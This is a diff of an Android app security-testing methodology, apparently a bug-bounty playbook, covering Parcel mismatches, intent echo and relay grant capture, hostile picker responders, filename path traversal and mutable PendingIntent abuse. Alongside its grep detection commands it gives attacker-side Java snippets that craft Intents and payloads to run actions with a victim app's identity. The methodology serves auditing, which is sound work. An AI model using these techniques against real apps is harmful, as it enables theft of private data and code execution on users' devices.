-  grep -rnE 'getParcelableExtra\(\s*[^,)]+\s*\)|getParcelable\(\s*[^,)]+\s*\)|getParcelableArrayList(Extra)?\(\s*[^,)]+\s*\)|getSerializable(Extra)?\(\s*[^,)]+\s*\)|readParcelable\(\s*[^,)]+\s*\)' out/sources/
+  grep -rnE 'getParcelableExtra\(\s*[^,)]+\s*\)|getParcelable\(\s*[^,)]+\s*\)|getParcelableArrayList(Extra)?\(\s*[^,)]+\s*\)|getSerializable(Extra)?\(\s*[^,)]+\s*\)|readParcelable\(\s*[^,)]+\s*\)' "$DEC/jadx/sources/"
   # the safe forms name a class:
-  grep -rnE 'getParcelable\([^,]+,\s*[A-Za-z.]+::class\.java|IntentCompat\.getParcelableExtra|BundleCompat\.getParcelable|getParcelableExtra\([^,]+,\s*[A-Za-z.]+\.class' out/sources/
-  grep -rn 'setClassLoader(\|BadParcelableException' out/sources/
+  grep -rnE 'getParcelable\([^,]+,\s*[A-Za-z.]+::class\.java|IntentCompat\.getParcelableExtra|BundleCompat\.getParcelable|getParcelableExtra\([^,]+,\s*[A-Za-z.]+\.class' "$DEC/jadx/sources/"
+  grep -rn 'setClassLoader(\|BadParcelableException' "$DEC/jadx/sources/"
   ```
 - **Proof:** Untyped call sites on a Bundle or Intent that originated from an exported component, a
   notification, a widget fill-in or a Wear message — plus a crafted Intent carrying a different Parcelable
@@ -1198,9 +1231,11 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   evidence the class is instantiated *before* the type check.
 - **Escalation:** Medium standalone; High when combined with D08-029 (a mismatched class) or when the
   crafted type reaches a class whose `createFromParcel` has side effects. Note the platform lesson from
-  CVE-2023-45777: even a typed check helps only if it is applied before the value is used.
+  CVE-2023-45777: even a typed check helps only if it is applied before the value is used. The gadget hunt
+  for the deserialised type is D17-045; this row owns the untyped read on the forwarding path.
 - **Ruled out when:** Every read of externally sourced Parcelable/Serializable data uses the typed overload
-  or `IntentCompat`/`BundleCompat`, or `minSdkVersion` is below 33 **and** the app additionally validates
+  or `IntentCompat`/`BundleCompat` (on an R8 build: the renamed helper found by the D08-001 wrapper hop), or
+  `minSdkVersion` is below 33 **and** the app additionally validates
   `instanceof` before use — record which.
 
 ### D08-029 · App-defined `Parcelable` whose write and read byte counts disagree
@@ -1208,7 +1243,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) when the smuggled value defeats an auth check |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); `broken_authentication_and_session_management.authentication_bypass` (P1) when the smuggled value defeats an auth check |
 | **Attacker** | AM-03 |
 | **Applies to** | all; Android 13's length-prefixed `LazyValue` limits *cascading* corruption but, per CVE-2023-45777, does not save code that deserialises without a type |
 | **Maps to** | michalbednarski/ReparcelBug2 — **CVE-2021-0928** (`OutputConfiguration` write/read mismatch) with its four detection signs; michalbednarski/LeakValue — **CVE-2022-20452** (LazyValue referencing a recycled Parcel); **CVE-2023-20963** (WorkSource parcel/unparcel mismatch, exploited in the wild per Project Zero's RCA); **CVE-2024-49744**; Bundle Fengshui (Bundle magic `0x4C444E42`, length-prefixed lazy unparcel, AccountManagerService→Settings uid 1000 `launchAnyWhere`, CVE-2017-0806, CVE-2021-0748); `risks/unsafe-deserialization` (CWE-502, CWE-501) |
@@ -1221,13 +1256,14 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   rethrow, untyped collections via `readList()` without a `ClassLoader` constraint, nested variable-length
   objects, and mismatched field counts:
   ```bash
-  grep -rln 'implements Parcelable\|: Parcelable' out/sources/ | while read -r f; do
-    w=$(sed -n '/writeToParcel/,/^\s*}/p' "$f" | grep -cE 'write[A-Z][A-Za-z]*\(')
-    r=$(sed -n '/createFromParcel/,/^\s*}/p;/protected .*(Parcel/,/^\s*}/p' "$f" | grep -cE 'read[A-Z][A-Za-z]*\(')
+  grep -rln 'implements Parcelable\|: Parcelable' "$DEC/jadx/sources/" | while read -r f; do
+    n=$((n+1))
+    w=$(sed -n '/writeToParcel/,/^[[:space:]]*}/p' "$f" | grep -cE 'write[A-Z][A-Za-z]*\(')      # POSIX class: \s is GNU-only inside a sed address
+    r=$(sed -n '/createFromParcel/,/^[[:space:]]*}/p;/protected .*(Parcel/,/^[[:space:]]*}/p' "$f" | grep -cE 'read[A-Z][A-Za-z]*\(')
     [ "$w" != "$r" ] && echo "MISMATCH $f write=$w read=$r"
-  done | tee /tmp/d08_parcel_mismatch.txt
-  wc -l /tmp/d08_parcel_mismatch.txt          # count — a silent zero is a failed loop
-  grep -rn 'createFromParcel' out/sources/ -A25 | grep -nE 'catch\s*\(|readList\(|readParcelable\(|readBundle\(|readSerializable\('
+  done | tee "$E/logs/D08-029-mismatch.txt"
+  echo "checked=$(grep -rlc 'implements Parcelable\|: Parcelable' "$DEC/jadx/sources/" | wc -l) mismatches=$(wc -l < "$E/logs/D08-029-mismatch.txt")"   # the D08-064 count line
+  grep -rn 'createFromParcel' "$DEC/jadx/sources/" -A25 | grep -nE 'catch\s*\(|readList\(|readParcelable\(|readBundle\(|readSerializable\('
   ```
   Differential instrumentation:
   ```javascript
@@ -1259,7 +1295,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
 | **Maps to** | AOSP "AIDL overview" (objects packed onto a buffer and copied to the remote process); Bundle Fengshui analysis of AccountManagerService forwarding a Bundle to Settings (uid 1000) which then executed Intents inside it — the `launchAnyWhere` pattern; `risks/unsafe-deserialization` |
@@ -1270,7 +1306,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   capability crossing a trust boundary.
 - **How:**
   ```bash
-  grep -rnE 'getExtras\(\)|putExtras\(|getBundleExtra|putBinder|getBinder' out/sources/ -A8 \
+  grep -rnE 'getExtras\(\)|putExtras\(|getBundleExtra|putBinder|getBinder' "$DEC/jadx/sources/" -A8 \
     | grep -B4 -A6 -E 'startActivity|startService|sendBroadcast|\.send\(|bindService'
   ```
   From the stub, craft a Bundle with unexpected keys:
@@ -1307,7 +1343,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | any app declaring `android:process` or using multiprocess WorkManager |
 | **Maps to** | michalbednarski/ReparcelBug2 (**CVE-2021-0928**) and TheLastBundleMismatch (**CVE-2023-45777**) applied to an app's own IPC rather than the framework's |
@@ -1317,9 +1353,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   reviews the app's internal IPC for it.
 - **How:**
   ```bash
-  grep -n 'android:process' out/AndroidManifest.merged.xml
-  grep -rn 'androidx.work.multiprocess\|RemoteListenableWorker\|RemoteWorkManager' out/sources/ out/AndroidManifest.merged.xml
-  grep -rln 'implements Parcelable' out/sources/ | xargs grep -ln 'catch'
+  grep -n 'android:process' "$DEC/AndroidManifest.merged.xml"
+  grep -rn 'androidx.work.multiprocess\|RemoteListenableWorker\|RemoteWorkManager' "$DEC/jadx/sources/" "$DEC/AndroidManifest.merged.xml"
+  grep -rln 'implements Parcelable' "$DEC/jadx/sources/" | xargs grep -ln 'catch'
   ```
   Then instrument both sides of the boundary and compare the decoded object.
 - **Proof:** A `Bundle` that validates in the entry process but decodes to a different object in the worker
@@ -1335,10 +1371,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Medium |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); with a demonstrated gadget, `server_side_injection.remote_code_execution_rce` (P1) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); with a demonstrated gadget, `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | `targetSdk < 33` is where the untyped getters are the default idiom; from API 33 the typed `getSerializableExtra(String, Class)` exists and its absence at a hit is the finding |
-| **Requires** | exported-activity, exported-service, exported-receiver |
 | **Maps to** | `risks/unsafe-deserialization` (CVE-2014-7911 `ObjectInputStream`/Android < 5.0, look-ahead `ObjectInputFilter` mitigation); rule `mastg-android-object-deserialization`; MASWE-0050 (CWE-502) |
 
 - **Test:** An exported component that deserialises an object it does not type-check instantiates
@@ -1347,10 +1382,10 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   frequently the thing that drives the forward.
 - **How:**
   ```bash
-  grep -rnE 'getSerializableExtra\(|readSerializable\(|ObjectInputStream|readObject\(' out/sources/ | grep -v test
-  grep -rn 'implements Serializable' out/sources/ | wc -l
-  grep -rn -A10 'private void readObject' out/sources/       # gadget candidates inside the app
-  grep -rn 'setObjectInputFilter' out/sources/               # the mitigation; absence is the gap
+  grep -rnE 'getSerializableExtra\(|readSerializable\(|ObjectInputStream|readObject\(' "$DEC/jadx/sources/" | grep -v test
+  grep -rn 'implements Serializable' "$DEC/jadx/sources/" | wc -l
+  grep -rn -A10 'private void readObject' "$DEC/jadx/sources/"       # gadget candidates inside the app
+  grep -rn 'setObjectInputFilter' "$DEC/jadx/sources/"               # the mitigation; absence is the gap
   ```
   Build the payload by loading the target's own `classes.dex` in the stub:
   ```java
@@ -1364,10 +1399,11 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   startActivity(i);
   ```
 - **Proof:** The gadget's `readObject()` side effect observable — a file created at the path you set
-  (`adb shell run-as com.target.app ls -l files/` on a debuggable build), or logic executing on
+  (`adb -s "$SERIAL" shell run-as com.target.app ls -l files/` on a debuggable build), or logic executing on
   attacker-chosen field values. A `ClassCastException` in logcat proves the object was instantiated before
   the type check.
-- **Escalation:** → D17 for the gadget hunt and the write→code-load chain. Report RCE only with a
+- **Escalation:** → D17-045 for the gadget hunt and the write→code-load chain (that row owns the untyped
+  deserialization; this one keeps only the "the object drives the forward" half). Report RCE only with a
   demonstrated gadget; otherwise state "logic forgery" and keep it at Medium.
 - **Ruled out when:** Every `getSerializableExtra` uses the typed overload, or no exported component
   deserialises at all, or the app ships an `ObjectInputFilter` allow-list on the path.
@@ -1377,7 +1413,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the read file yields an API token; otherwise `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the read file yields an API token; otherwise `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all. `android:grantUriPermissions="true"` on a non-exported provider is what makes the victim's **own** providers reachable this way; the `<provider>` default for that attribute is `"false"` |
 | **Requires** | exported-activity |
@@ -1390,10 +1426,19 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   ```java
   protected void onCreate(Bundle b) { setResult(-1, getIntent()); finish(); }
   ```
+  Second shape — the **relay**: `onActivityResult(rc, res, data) { setResult(res, data); finish(); }`. The
+  relay starts a picker/sub-activity, receives its result Intent and hands it to whoever started the relay.
+  Your stub answers the picker (D08-035) with `data=content://<victim-authority>/...` plus `FLAG_GRANT_*`;
+  the system drops the grant your responder could not issue but keeps the flags in the Intent, and the
+  relay's own `setResult` then issues the grant from the **victim's** UID. The self-echo grep below does not
+  find it; the second and third greps do.
 - **How:**
   ```bash
-  grep -rnE 'setResult\([^,)]*,\s*getIntent\(\)\)|setResult\(-1,\s*getIntent\(\)\)|setResult\([^,)]*,\s*intent\)' out/sources/
-  grep -rn 'setResult(' out/sources/ -B4 -A4 | grep -nE 'getParcelableExtra|getData\(\)|FLAG_GRANT'
+  grep -rnE 'setResult\([^,)]*,\s*getIntent\(\)\)|setResult\(-1,\s*getIntent\(\)\)|setResult\([^,)]*,\s*intent\)' "$DEC/jadx/sources/"
+  grep -rn 'setResult(' "$DEC/jadx/sources/" -B4 -A4 | grep -nE 'getParcelableExtra|getData\(\)|FLAG_GRANT'
+  # the relay: a received result Intent object forwarded to setResult
+  grep -rn -A6 'onActivityResult' "$DEC/jadx/sources/" | grep -nE 'setResult\([^,)]+,[[:space:]]*[a-z]'
+  grep -rnE 'registerForActivityResult|ActivityResultCallback' -A8 "$DEC/jadx/sources/" | grep -nE 'setResult\('
   ```
   Attacker side:
   ```java
@@ -1411,9 +1456,11 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   show `dumpsys activity providers | grep -A5 UriPermission` listing your package.
 - **Escalation:** D08-034 for the system-provider variant; D08-012 to make it persistent; → D07 for what
   the provider holds; → D11/D13 once you have the token file.
-- **Ruled out when:** No `setResult` receives `getIntent()` or a derivative of it, every result Intent is a
-  freshly constructed object carrying only named extras, and `dumpsys activity providers` shows no grant to
-  your package after the round trip.
+- **Ruled out when:** No `setResult` receives `getIntent()` or a derivative of it, no
+  `onActivityResult`/result-callback forwards the received Intent object to `setResult` (a fresh Intent
+  with copied named extras only), every result Intent is a freshly constructed object carrying only named
+  extras, and `dumpsys activity permissions` shows no grant to your package after the round trip. The
+  activity-surface entry for the same echo is D04-023; this row owns the grant mechanism.
 
 ### D08-034 · Echo or redirect aimed at a system provider the victim holds permission for
 
@@ -1423,7 +1470,6 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null — rated on the data) |
 | **Attacker** | AM-03 (the attacker holds **no** runtime permissions) |
 | **Applies to** | all apps that hold a dangerous permission — contacts, SMS, call log, calendar, media |
-| **Requires** | exported-activity, deeplink |
 | **Maps to** | Oversecured "Gaining access to arbitrary Content Providers" vector 4 (permission capture via a permission-holding app); ATT&CK T1409 Stored Application Data; `risks/content-resolver` (`belongsToCurrentApplication()`, `isExported()`, `checkUriPermission()` are the documented validators whose absence is the bug) |
 
 - **Test:** The echo and the forward do not only re-delegate the victim's *own* provider access. They
@@ -1431,7 +1477,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   UID. Enumerate what the target holds, then aim the primitive at the matching system authority.
 - **How:**
   ```bash
-  adb shell dumpsys package com.target.app | sed -n '/runtime permissions/,/^$/p'
+  adb -s "$SERIAL" shell dumpsys package com.target.app | sed -n '/runtime permissions/,/^$/p'
   ```
   Then, through whichever primitive you proved (D08-033 or D08-007):
   ```java
@@ -1439,13 +1485,12 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   // or ContactsContract.RawContacts.CONTENT_URI, content://sms, content://call_log/calls
   i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
   ```
-  Also test the proxy-read direction, where the victim reads for you and renders or uploads the result:
-  ```bash
-  adb shell am start -n com.target.app/.Import --eu android.intent.extra.STREAM 'content://com.android.contacts/contacts'
-  ```
+  The proxy-read direction (the victim reads a system URI for you and renders or uploads it) is one
+  experiment owned by D08-058 — run it there once and cite the row here; this item keeps only the grant/echo
+  re-delegation of a held permission.
 - **Proof:** Rows from a system provider dumped in the attacker process, with the attacker's manifest
   showing **only** `INTERNET`. Log the first few rows (masking the values, keeping the column names — the
-  triager needs the JSON/column keys, not the PII). Then `adb shell dumpsys package com.attacker.poc` to
+  triager needs the JSON/column keys, not the PII). Then `adb -s "$SERIAL" shell dumpsys package com.attacker.poc` to
   show no dangerous permission granted.
 - **Escalation:** Contacts/SMS/call-log disclosure by a zero-permission app is a privacy P1-class narrative
   on most programmes; → D20 for the privacy framing, → D13 if the SMS provider yields an OTP.
@@ -1458,7 +1503,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 + one user tap (the picker/chooser) |
 | **Applies to** | all apps that call `ACTION_GET_CONTENT`, `ACTION_OPEN_DOCUMENT`, `ACTION_PICK`, `IMAGE_CAPTURE`, or any share/import flow |
 | **Requires** | device |
@@ -1467,11 +1512,13 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 - **Test:** Everyone tests the app as a *receiver* of intents. The responder side is the one nobody
   reviews: when the app asks another app for content, the **responder controls** `Intent.getData()`,
   `ClipData`, the extras and any provider metadata the caller then queries. Treating that as trusted is the
-  bug, and it runs with the caller's own filesystem identity.
+  bug, and it runs with the caller's own filesystem identity. Winning the resolution for `ACTION_PICK`/
+  `GET_CONTENT` is D05-046 and the `file://`-to-private-file payload is D07-063; this row owns what the
+  result handler does with the responder's Intent — settle the three with one stub.
 - **How:**
   ```bash
-  grep -rn 'startActivityForResult\|ActivityResultLauncher\|registerForActivityResult\|onActivityResult' out/sources/
-  grep -rn 'getData()\|getClipData()\|openInputStream\|contentResolver.query\|OpenableColumns.DISPLAY_NAME' out/sources/
+  grep -rn 'startActivityForResult\|ActivityResultLauncher\|registerForActivityResult\|onActivityResult' "$DEC/jadx/sources/"
+  grep -rn 'getData()\|getClipData()\|openInputStream\|contentResolver.query\|OpenableColumns.DISPLAY_NAME' "$DEC/jadx/sources/"
   ```
   Register a hostile responder in the stub app with a matching filter and `android:priority="999"`:
   ```xml
@@ -1505,78 +1552,80 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the write lands on a loaded library or DEX; otherwise `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the write lands on a loaded library or DEX; otherwise `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 + one user tap |
 | **Applies to** | all apps that accept shared files |
 | **Requires** | device |
 | **Maps to** | `risks/untrustworthy-contentprovider-provided-filename` — **CWE-73: External Control of Filename or Path**, impact listed as "Malicious code execution — overwrite application executables or DEX files"; MASTG-KNOW-0138 (the `File(dir, name)` → `../lib-main/lib.so` example); MASTG-TEST-0375; MASWE-0050 |
 
-- **Test:** The inverse of the usual provider test, and the single most commonly missed one. The victim
-  queries your provider for `OpenableColumns.DISPLAY_NAME` to name the file it is about to write. You
-  return `../../lib-main/lib.so` and `new File(context.getFilesDir(), name)` resolves it normally — an
-  arbitrary write inside the victim's sandbox.
-- **How:**
+- **Test:** Delivery variant of D07-062 (Dirty Stream — the consumer trusts `OpenableColumns.DISPLAY_NAME`
+  from a hostile provider): settle it there, record the delivery route (share target, import activity,
+  `ACTION_SEND` filter) on this row, and here only match the write destination against the D17 loader list.
+- **How:** Run D07-062 (stock-`FileProvider` form first). Then, for the destination the traversal reached:
   ```bash
-  grep -rnE 'OpenableColumns|DISPLAY_NAME|getColumnIndex\(.*DISPLAY_NAME' out/sources/
-  grep -rn 'new File(' out/sources/ | grep -iE 'displayname|filename|name'
-  grep -rn 'getCanonicalPath\(\)\.startsWith' out/sources/     # the fix; absence is the bug
+  grep -rn 'DexClassLoader\|PathClassLoader\|System.load(\|System.loadLibrary(\|createPackageContext' "$DEC/jadx/sources/"
+  grep -rn 'getDir(\|getFilesDir()\|getCodeCacheDir()\|nativeLibraryDir' "$DEC/jadx/sources/"
   ```
-  In the stub provider's `query()`:
-  ```java
-  MatrixCursor c = new MatrixCursor(new String[]{OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE});
-  c.addRow(new Object[]{"../lib-main/lib.so", payload.length});
-  return c;
-  ```
-- **Proof:** After the share, `adb shell run-as com.target.app ls -l files/ lib-main/` (debuggable build)
-  showing your file at the traversed path, or a behaviour change proving the overwritten file took effect.
-  The control: a benign `DISPLAY_NAME` writes to the expected directory.
+- **Proof:** The D07-062 proof (the file at the traversed path, with the benign-name control), plus the
+  loader that consumes that directory at file:line — or the explicit statement that none does.
 - **Escalation:** → D17: overwrite a `.dex`/`.jar`/`.so` the app later loads → persistent code execution as
-  the victim. Match the write destination against the load source:
-  ```bash
-  grep -rn 'DexClassLoader\|PathClassLoader\|System.load(\|System.loadLibrary(\|createPackageContext' out/sources/
-  grep -rn 'getDir(\|getFilesDir()\|getCodeCacheDir()\|nativeLibraryDir' out/sources/
-  ```
-  If no code-load path consumes the writable directory, keep the base severity and state the ceiling
-  separately: "High; ceiling = RCE **if** a writable code-load path exists — not shown."
-- **Ruled out when:** The app canonicalises and prefix-checks
+  the victim. If no code-load path consumes the writable directory, keep the base severity and state the
+  ceiling separately: "High; ceiling = RCE **if** a writable code-load path exists — not shown."
+- **Ruled out when:** As D07-062 — the app canonicalises and prefix-checks
   (`getCanonicalPath().startsWith(targetDir.getCanonicalPath() + File.separator)`) before writing, or
-  discards `DISPLAY_NAME` entirely and generates its own filename.
+  discards `DISPLAY_NAME` entirely and generates its own filename; record the D07-062 outcome here.
 
 ### D08-037 · Mutable `PendingIntent` with a blank or implicit base Intent
 
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) or `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) when the fired action is authenticated |
+| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) or `broken_access_control.exposed_sensitive_android_intent` (varies); `broken_authentication_and_session_management.authentication_bypass` (P1) when the fired action is authenticated |
 | **Attacker** | AM-03; AM-04 when acquisition needs the notification-listener grant (D08-040) |
 | **Applies to** | **LEGACY default:** below API 31 `PendingIntent` objects were mutable by default, so an omitted flags argument is the vulnerable case. From targetSdk 31 mutability must be declared explicitly or creation throws `IllegalArgumentException` — so on a modern target an explicit `FLAG_MUTABLE` is the thing to hunt, and it is a deliberate developer choice |
 | **Maps to** | MASTG-TEST-0381 (References to Insecure PendingIntent Creation), MASTG-KNOW-0024, MASTG-BEST-0063, rule `mastg-android-pendingintent-mutable`, MASTG-TEST-0030 (deprecated predecessor, source of the Frida hook); MASWE-0032 (CWE-927, CWE-940); **CVE-2020-0389 / A-156959408** (base intent implicit *and* PendingIntent mutable); `risks/pending-intent`; Google Play ASI "Implicit PendingIntent" campaign (2022-02-22); mindedsecurity `MSTG-PLATFORM-4_1`; QARK `implicit_intent_to_pending_intent.py`; Google Mobile VRP "Vulnerabilities caused by unsafe usage of pending intents" |
 
 - **Test:** AOSP's own javadoc: "By giving a PendingIntent to another application, you are granting it the
   right to perform the operation you have specified as if the other application was yourself (with the same
-  permissions and identity)." Mutable means the holder can `fillIn()` the unset fields; an implicit or
-  blank base intent means the *component* is one of them. Together that is arbitrary component invocation
-  as the victim.
+  permissions and identity)." What a sender can change is fixed by AOSP `Intent.fillIn`: flags are
+  **always** OR-ed in (so `FLAG_GRANT_*` always lands); action, data/type, package and clipData are filled
+  only where the base left them unset; extras are merged but the base's value wins for an existing key;
+  **component and selector are copied only if the creator passed `Intent.FILL_IN_COMPONENT` (0x8) /
+  `FILL_IN_SELECTOR` (0x40) in the PendingIntent flags.** So the attack is never "name a component" — it is:
+  (a) implicit base (no component, no package): fill `setPackage(<your pkg>)`, or stay implicit and win
+  resolution with a filter that matches the base action plus your data URI; the intent arrives in **your**
+  activity carrying the victim's identity and grant flags; (b) package-only base (D08-038): you cannot add a
+  component; fill action (if unset) + data so resolution inside the victim's package lands on a non-exported
+  component whose filter matches — the platform resolves it because the sender is the victim's own UID;
+  (c) explicit-component base: only data/extras/clip/flags are fillable, and the question becomes what that
+  component does with them (D08-013); (d) `flags & 0x8` or `& 0x40` present: full retarget — rare, grep for
+  it (the D08-003 census prints `fillComponent=`/`fillSelector=`).
 - **How:**
   ```bash
-  semgrep --config rules/mastg-android-pendingintent-mutable.yml out/sources/
+  semgrep --config rules/mastg-android-pendingintent-mutable.yml "$DEC/jadx/sources/"
   # the rule flags a flags argument of: 0, 134217728 (FLAG_UPDATE_CURRENT), 33554432 (FLAG_MUTABLE),
   # 0x08000000, 0x02000000, PendingIntent.FLAG_UPDATE_CURRENT, PendingIntent.FLAG_MUTABLE
-  grep -rnE 'PendingIntent\.(getActivity|getActivities|getBroadcast|getService|getForegroundService)\s*\(' out/sources/ -A4 \
+  grep -rnE 'PendingIntent\.(getActivity|getActivities|getBroadcast|getService|getForegroundService)\s*\(' "$DEC/jadx/sources/" -A4 \
     | grep -vE 'FLAG_IMMUTABLE'
   # for each hit read the base Intent construction — the dangerous shape is new Intent() with no component
-  grep -rn -B8 'PendingIntent.get' out/sources/ | grep -E 'new Intent\(|setClass|setComponent|setClassName|setPackage'
-  grep -rn 'FLAG_MUTABLE\|FLAG_IMMUTABLE\|FLAG_ONE_SHOT\|FLAG_UPDATE_CURRENT\|FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT' out/sources/
+  grep -rn -B8 'PendingIntent.get' "$DEC/jadx/sources/" | grep -E 'new Intent\(|setClass|setComponent|setClassName|setPackage'
+  grep -rn 'FLAG_MUTABLE\|FLAG_IMMUTABLE\|FLAG_ONE_SHOT\|FLAG_UPDATE_CURRENT\|FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT' "$DEC/jadx/sources/"
+  # R8 inlines the constants — the numeric fallback (decode with the table below); a zero on the symbolic grep alone is never a negative
+  grep -rnE 'PendingIntent\.get(Activity|Activities|Broadcast|Service|ForegroundService)\([^;]*,[[:space:]]*(0|33554432|67108864|134217728|1073741824|16777216|0x[0-9a-fA-F]+)[[:space:]]*\)' "$DEC/jadx/sources/"
   ```
   Flag values for a smali/obfuscated read: `FLAG_MUTABLE 0x02000000` (33554432),
   `FLAG_IMMUTABLE 0x04000000` (67108864), `FLAG_UPDATE_CURRENT 0x08000000` (134217728),
-  `FLAG_ONE_SHOT 0x40000000`. Build-log tell: lint `UnspecifiedImmutableFlag`.
-  Exploit once you hold the token:
+  `FLAG_ONE_SHOT 0x40000000` (1073741824), `FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT 0x01000000` (16777216); the
+  low-order fill-in bits: `FILL_IN_ACTION 0x1`, `FILL_IN_DATA 0x2`, `FILL_IN_COMPONENT 0x8`,
+  `FILL_IN_PACKAGE 0x10`, `FILL_IN_SELECTOR 0x40`, `FILL_IN_CLIP_DATA 0x80`. Build-log tell: lint
+  `UnspecifiedImmutableFlag`. Once you hold the token, the fill-in is shaped by the base per the Test above:
   ```java
   Intent fill = new Intent();
-  fill.setClassName("com.target.app", "com.target.app.internal.AdminActivity");
-  fill.setData(Uri.parse("content://com.target.app.internalprovider/secrets"));
-  fill.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+  fill.setData(Uri.parse("content://<victim-authority>/<path from D08-006>"));   // honoured only if the base has no data
+  fill.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);                          // flags are always OR-ed in
+  fill.setPackage("<attacker-pkg>");                                             // honoured only if the base has no package
+  // no setClassName(): a component is dropped by fillIn unless the creator passed FILL_IN_COMPONENT.
+  // The stub declares an <intent-filter> for the base action with <data android:scheme="content"/> so resolution lands on it.
   pi.send(context, 0, fill);            // executes with the VICTIM's identity
   ```
 - **Proof:** The victim's non-exported component starting — `dumpsys activity activities` naming it as
@@ -1607,14 +1656,17 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   payload shape to build.
 - **How:**
   ```bash
-  grep -rn -B2 -A6 'FLAG_MUTABLE' out/sources/ | grep -n 'setPackage('
+  grep -rn -B2 -A6 'FLAG_MUTABLE' "$DEC/jadx/sources/" | grep -n 'setPackage('
   # negative tell: the exception when the app got it wrong
-  adb logcat | grep -iE 'IllegalArgumentException.*PendingIntent'
+  adb -s "$SERIAL" logcat | grep -iE 'IllegalArgumentException.*PendingIntent'
   ```
-  The injected `ComponentName` must be inside the victim package:
+  A component cannot be added by the sender (`fillIn` drops it without `FILL_IN_COMPONENT`, D08-037); what
+  resolves inside the victim package is a filled **action + data** that matches a non-exported component's
+  own filter — pair with the D08-016 manifest list of internal actions:
   ```java
-  pi.send(ctx, 0, new Intent().setClassName("com.target.app", "com.target.app.internal.AdminActivity"));
+  pi.send(ctx, 0, new Intent("<action declared on a non-exported component>").setData(Uri.parse("<matching data>")));
   ```
+  Without a matching filter the package-only base is only data/extras/flag-fillable (D08-013).
 - **Proof:** The victim's non-exported internal activity/receiver starting from your `send()`. Use this
   item as a **rule-in**: if the app targets 34+ and still ships a mutable PendingIntent, it necessarily has
   a component or package set, so your attack is the fill-in-the-remaining-fields variant, not full
@@ -1641,9 +1693,10 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   exact shape the platform blocks — treat it as a priority target.
 - **How:**
   ```bash
-  grep -rn 'FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT' out/sources/ out/smali*/
-  adb shell am compat enable BLOCK_MUTABLE_IMPLICIT_PENDING_INTENT com.target.app   # debuggable build
-  adb logcat | grep -iE 'IllegalArgumentException.*PendingIntent|BLOCK_MUTABLE_IMPLICIT'
+  grep -rn 'FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT' "$DEC/jadx/sources/" "$DEC/apktool/smali"*/
+  grep -rnE '16777216|0x1000000\b' "$DEC/jadx/sources/" "$DEC/apktool/smali"*/ | grep -iE 'PendingIntent|flags'   # the inlined value (R8 strips the name)
